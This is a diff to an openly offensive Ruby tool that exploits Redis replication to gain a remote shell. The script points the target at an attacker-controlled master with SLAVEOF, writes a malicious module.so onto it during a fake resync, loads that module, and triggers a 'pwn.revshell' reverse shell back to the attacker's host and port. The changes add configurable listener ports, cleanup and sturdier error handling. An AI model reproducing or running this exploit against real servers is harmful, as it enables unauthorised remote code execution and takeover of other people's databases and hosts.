@@ -96,6 +96,8 @@ end
 
 def error msg
 	Log.err msg
+	cleanup
+	@server.close
 	exit 1
 end
 
@@ -115,12 +117,23 @@ def rec (print=true)
 	return msg || ""
 end
 
+def cleanup
+	Log.info "Cleaning up"
+	# Some amount of cleanup
+	send "SLAVEOF NO ONE"
+	rec
+end
+
 def exploit
-	server = TCPServer.new @opts[:lport]
+
+	Log.info "Opening revshell server on #{@opts[:lport]}"
+	# Connect-back @server
+	@server = TCPServer.new @opts[:lport]
 
 	send "pwn.revshell #{@opts[:lhost]} #{@opts[:lport]}"
 
-	shell = server.accept
+	Log.info "Waiting for connect-back"
+	shell = @server.accept
 
 	error "Error connecting to LHOST" if !rec.start_with? "+OK"
 	Log.succ "Succesfull connect-back"
@@ -143,23 +156,26 @@ end
 if @opts[:skip]
 	Log.info "Skipping module loading"
 	@client = TCPSocket.new(@opts[:host], @opts[:port])
-	@client
 	exploit
 	exit
 end
 
-#Our MASTER server
-server = TCPServer.new 2421
+#Our MASTER @server
+@server = TCPServer.new @opts[:lport]
 
-#We use this connection to force the server to connect to our master server
+Log.info "Opened TCP server on #{@opts[:lport]}"
+
+#We use this connection to force the @server to connect to our master @server
 initial_sock = TCPSocket.new(@opts[:host], @opts[:port])
 @client = initial_sock
 Log.info "Sending SLAVEOF command"
-send "SLAVEOF 127.0.0.1 2421"
+send "SLAVEOF #{@opts[:lhost]} #{@opts[:lport]}"
 error "Failed to send SLAVEOF" if !rec.start_with? "+OK"
 Log.info "Renaming database file"
 send "CONFIG SET dbfilename pwn"
 error "Failed to set dbfilename" if !rec.start_with? "+OK"
+
+#This socket is now pretty much discarded, untill used by the exploit function
 
 class String
 	def is_number?
@@ -168,13 +184,13 @@ class String
 end
 
 def parser msg
-	return Log.err "Can't parse argument count" if !msg.start_with? "*" or !msg[1..].is_number?
+	error "Can't parse argument count '#{msg}'" if !msg.start_with? "*" or !msg[1..].is_number?
 	argument_count = msg[1..].to_i
 	arguments = []
 
 	for i in (0..argument_count-1)
 		arg_length = rec false
-		return Log.err "Can't parse argument length" if !arg_length.start_with? "$" or !arg_length[1..].is_number?
+		error "Can't parse argument length '#{msg}'" if !arg_length.start_with? "$" or !arg_length[1..].is_number?
 		arg_length = arg_length[1..].to_i
 		argument = rec false
 		if argument.length != arg_length
@@ -188,7 +204,7 @@ end
 payload = File.read("./module.so")
 
 #We only accept once, it will attempt to make new connections because our data is invalid
-@client = server.accept
+@client = @server.accept
 Log.succ "Succesful connection with slave"
 
 # Resync database
@@ -220,10 +236,15 @@ error "Database resync failed, payload not send" if @payload_send == false
 
 @client = initial_sock #Reuse old connection to send commands
 
-sleep 0.5
+sleep 0.2
 Log.info "Attempt to load module"
 send "module load ./pwn"
-error "Failed to load module (if it's already loaded use the -s flag)" if !@client.gets.start_with? "+OK"
+error "Failed to load module (if it's already loaded use the -s flag)" if rec != "+OK"
 Log.succ "Succesfully loaded the module"
+
+cleanup
+
+#Close @server so it can be reopened
+@server.close
 
 exploit
